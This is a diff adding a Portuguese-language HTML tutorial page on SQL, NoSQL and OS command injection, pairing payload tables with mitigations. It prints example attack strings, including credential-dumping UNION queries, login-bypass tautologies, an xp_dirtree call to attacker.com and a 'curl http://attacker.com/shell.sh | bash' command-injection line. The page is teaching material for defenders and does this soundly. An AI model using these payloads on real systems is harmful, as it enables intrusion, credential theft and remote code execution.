@@ -1,0 +1,214 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark light" />
+  <meta name="description" content="Injeção de código: SQL Injection, NoSQL Injection, OS Command Injection e LDAP Injection — técnicas, payloads e mitigações." />
+  <link rel="preload" href="/css/base.css" as="style" fetchpriority="high" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="icon" href="/imagens/favicon/favicon.png" type="image/png">
+  <link rel="apple-touch-icon" href="/imagens/favicon/favicon.png">
+  <link rel="preload" href="/js/main.js" as="script">
+  <script src="/js/main.js" defer></script>
+  <title>Injection — SQL, NoSQL, OS Command | Site Guia</title>
+</head>
+
+<body>
+  <div class="nav-overlay"></div>
+  <div class="nav-interno-overlay"></div>
+  <button class="menu-toggle" title="Abrir/fechar navegação">
+    <span class="menu-icon">☰</span><span class="close-icon">&ltimes;</span>
+  </button>
+  <button class="menu-interno-toggle" title="Abrir/fechar menu interno">
+    <span class="menu-icon">☰</span><span class="close-icon">&rtimes;</span>
+  </button>
+  <div data-include="/html/Site/partials/header.html"></div>
+
+  <main class="main-content">
+    <div class="content-area">
+
+      <div class="Colored_border_anim_card_box">
+        <p><strong>Injection — SQL, NoSQL, OS Command, LDAP</strong></p>
+      </div>
+
+      <section>
+        <h2 id="intro" class="section-title">O que é Injection?</h2>
+
+        <div class="page-header">
+          <div class="logo logo--lg page-icon" role="img" aria-label="Dragão do Site Guia"></div>
+          <h1>Injection — SQL, NoSQL, OS Command, LDAP</h1>
+          <p>Dados não confiáveis interpretados como comandos — SQLi, NoSQL, OS Command, LDAP.</p>
+        </div>
+
+        <p class="intro-highlight">Ataques de injeção ocorrem quando dados não confiáveis são enviados para um interpretador (banco de dados, shell, LDAP, XML) como parte de um comando ou query. O atacante quebra o contexto pretendido e faz o interpretador executar comandos arbitrários. É A03 no OWASP Top 10 2021.</p>
+        <div class="section-divider"></div>
+      </section>
+
+      <section>
+        <h2 id="sqli" class="section-title">SQL Injection (SQLi)</h2>
+        <div class="section-divider"></div>
+
+        <p>O atacante injeta SQL em campos de entrada para manipular queries ao banco de dados. Pode resultar em vazamento de dados, bypass de autenticação, modificação/deleção de dados e até RCE.</p>
+
+        <div class="scroll-x">
+          <table>
+            <thead>
+              <tr><th>Tipo</th><th>Como funciona</th><th>Payload Exemplo</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Error-Based</strong></td>
+                <td>Usa mensagens de erro do DB para exfiltrar dados</td>
+                <td><span class="code-inline">' AND extractvalue(1,concat(0x7e,version()))--</span></td>
+              </tr>
+              <tr>
+                <td><strong>UNION-Based</strong></td>
+                <td>Acrescenta SELECT adicional para retornar colunas extras</td>
+                <td><span class="code-inline">' UNION SELECT username,password FROM users--</span></td>
+              </tr>
+              <tr>
+                <td><strong>Blind Boolean</strong></td>
+                <td>Resposta muda (verdadeiro/falso) — inferência bit a bit</td>
+                <td><span class="code-inline">' AND SUBSTRING(password,1,1)='a'--</span></td>
+              </tr>
+              <tr>
+                <td><strong>Blind Time-Based</strong></td>
+                <td>Usa sleep/delay para inferir sem diferença na resposta</td>
+                <td><span class="code-inline">' AND SLEEP(5)--  (MySQL)</span></td>
+              </tr>
+              <tr>
+                <td><strong>Out-of-Band</strong></td>
+                <td>Exfiltra dados via DNS/HTTP para servidor do atacante</td>
+                <td><span class="code-inline">'; EXEC xp_dirtree '//attacker.com/a'--</span></td>
+              </tr>
+              <tr>
+                <td><strong>Auth Bypass</strong></td>
+                <td>Bypassa login com tautologia</td>
+                <td><span class="code-inline">admin'--  /  ' OR '1'='1'--</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <pre class="code-block">
+# Query vulnerável:
+query = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pwd + "'"
+
+# Input: user = admin'--   pwd = qualquer
+# Query resultante: SELECT * FROM users WHERE username='admin'--' AND password='...'
+#                                                                ^^
+#                                                         comentário SQL — tudo após ignorado
+# Retorna usuário admin sem verificar senha!
+
+# Mitigação — Prepared Statement (Python + mysql):
+cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (user, pwd))</pre>
+      </section>
+
+      <section>
+        <h2 id="nosqli" class="section-title">NoSQL Injection</h2>
+        <div class="section-divider"></div>
+
+        <p>Bancos NoSQL como MongoDB usam operadores diferentes, mas também são vulneráveis quando dados do usuário são inseridos em queries sem sanitização.</p>
+
+        <div class="grid-cards">
+          <div class="card card--danger">
+            <h3 class="text--danger">MongoDB — Operator Injection</h3>
+            <pre class="code-block" style="font-size:0.8rem">
+# Requisição normal:
+{ "username": "admin", "password": "secret" }
+
+# Payload de bypass (enviar JSON):
+{ "username": "admin", "password": { "$ne": null } }
+# $ne = not equal → senha diferente de null → sempre verdadeiro
+
+# Também funciona via query string (Express.js):
+?username=admin&password[$ne]=x
+# Express converte para: { password: { $ne: 'x' } }</pre>
+          </div>
+          <div class="card card--success">
+            <h3>Mitigação NoSQLi</h3>
+            <ul>
+              <li>Validar/sanitizar tipos: rejeitar objetos onde string é esperada</li>
+              <li>Usar ODM (Mongoose) com esquemas tipados</li>
+              <li>Desabilitar operadores desnecessários</li>
+              <li>Sanitizar com bibliotecas como <span class="code-inline">mongo-sanitize</span></li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="os-command" class="section-title">OS Command Injection</h2>
+        <div class="section-divider"></div>
+
+        <p>Quando a aplicação passa input do usuário para funções de execução de sistema (<span class="code-inline">system()</span>, <span class="code-inline">exec()</span>, <span class="code-inline">popen()</span>), o atacante pode encadear comandos adicionais.</p>
+
+        <div class="scroll-x">
+          <table>
+            <thead>
+              <tr><th>Separador</th><th>Significado</th><th>Payload Exemplo</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><span class="code-inline">;</span></td><td>Executa próximo comando</td><td><span class="code-inline">127.0.0.1; cat /etc/passwd</span></td></tr>
+              <tr><td><span class="code-inline">&&</span></td><td>Executa se anterior sucesso</td><td><span class="code-inline">127.0.0.1 &amp;&amp; whoami</span></td></tr>
+              <tr><td><span class="code-inline">||</span></td><td>Executa se anterior falha</td><td><span class="code-inline">invalid || id</span></td></tr>
+              <tr><td><span class="code-inline">|</span></td><td>Pipe — output para input</td><td><span class="code-inline">127.0.0.1 | ls -la</span></td></tr>
+              <tr><td><span class="code-inline">`cmd`</span></td><td>Substituição de comando (bash)</td><td><span class="code-inline">host`whoami`</span></td></tr>
+              <tr><td><span class="code-inline">$(cmd)</span></td><td>Substituição de comando</td><td><span class="code-inline">host$(id)</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <pre class="code-block">
+# Código PHP vulnerável:
+$output = shell_exec("ping -c 4 " . $_GET['host']);
+
+# Input: 8.8.8.8; curl http://attacker.com/shell.sh | bash
+# Executa: ping -c 4 8.8.8.8; curl http://attacker.com/shell.sh | bash
+
+# Mitigação — nunca passar input direto ao shell:
+# Python: subprocess com lista (sem shell=True)
+subprocess.run(["ping", "-c", "4", host])  # host não pode injetar separadores</pre>
+      </section>
+
+      <section>
+        <h2 id="mitigacoes" class="section-title">Mitigações Gerais</h2>
+        <div class="section-divider"></div>
+
+        <div class="grid-cards">
+          <div class="panel">
+            <p class="panel-title">Prepared Statements / Parameterized Queries</p>
+            <p>A defesa número 1 contra SQLi. Separa código SQL dos dados — o DB nunca interpreta o input como SQL. Disponível em todas as linguagens modernas.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">ORM / ODM</p>
+            <p>Use ORMs (SQLAlchemy, Hibernate, ActiveRecord) que geram queries parametrizadas automaticamente. Cuidado com raw queries dentro do ORM.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">Validação de Input rigorosa</p>
+            <p>Whitelist de caracteres permitidos. Rejeite tipos inesperados. Para OS commands, use APIs de linguagem em vez de chamadas shell.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">Princípio do Menor Privilégio</p>
+            <p>Conta do banco de dados com permissões mínimas. Nunca DBA/root para leitura de dados. Limita impacto de SQLi bem-sucedido.</p>
+          </div>
+        </div>
+      </section>
+
+      <div class="callout">
+        <p>SQLi ainda aparece em sistemas legados e em ORMs mal utilizados. Ferramentas como sqlmap automatizam a detecção e exploração. Em bug bounty, injeções em parâmetros menos óbvios (headers HTTP, cookies, campos JSON aninhados) são comuns achados. Sempre teste todos os pontos de entrada.</p>
+        <p class="frase-destaque">
+          <span data-svg="estrela" aria-hidden="true"></span>
+          "Separar dados de código é o princípio fundamental que elimina toda a família de ataques de injeção."
+        </p>
+      </div>
+
+    </div>
+  </main>
+
+  <div data-include="/html/Site/partials/footer.html"></div>
+</body>
+
+</html>
